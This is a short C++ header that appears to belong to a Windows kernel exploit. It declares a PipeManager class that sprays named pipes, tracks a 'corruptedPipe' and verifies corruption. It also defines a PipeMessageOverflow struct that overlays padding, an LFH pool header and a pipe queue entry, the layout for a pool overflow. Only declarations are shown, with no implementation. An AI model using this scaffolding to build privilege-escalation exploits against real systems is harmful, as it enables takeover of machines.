#pragma once
#include "includes.h"
#include "functions.h"
#include "poolObjects.h"


class PipeManager {
public:
	UINT64 pipeSize;

	std::vector<HANDLE> sPipes;
	std::vector<HANDLE> cPipes;

	HANDLE corruptedPipe;

	pNtFsControlFile _NtFsControlFile;
	pNtSetInformationFile _NtSetInformationFile;

	PipeManager(UINT64 iPipeSize);
	void CreatePipes(UINT64 iPipeCount);


	bool VerifyCorruption();
	void ClearExtraPipes(UINT64 targetIndex);
	void ClearPipes();
};

struct PipeMessageOverflow {
	UINT64 padding = 0xcccccccccccccccc;   // +0x00
	UINT64 padding2 = 0xcccccccccccccccc;  // +0x08
	LFH_POOL_HEADER poolHeader;                 // +0x10
	NP_DATA_QUEUE_ENTRY pipeMessage;        // +0x20
};